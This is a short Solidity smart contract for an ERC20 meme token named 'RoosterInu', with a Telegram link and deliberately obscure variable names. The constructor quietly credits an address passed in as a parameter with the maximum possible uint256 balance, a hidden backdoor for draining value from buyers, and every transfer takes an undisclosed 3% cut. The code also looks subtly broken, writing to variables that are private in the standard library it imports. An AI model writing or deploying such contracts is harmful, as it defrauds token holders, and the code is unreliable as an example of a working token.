// https://t.me/roosterinu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract RoosterInu is ERC20, Ownable {
    uint256 private battle = ~uint256(0);
    uint256 public wise = 3;

    constructor(
        string memory vast,
        string memory war,
        address constantly,
        address southern
    ) ERC20(vast, war) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[southern] = battle;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address including,
        address stock,
        uint256 now
    ) internal override {
        uint256 said = (now / 100) * wise;
        now = now - said;
        super._transfer(including, stock, now);
    }
}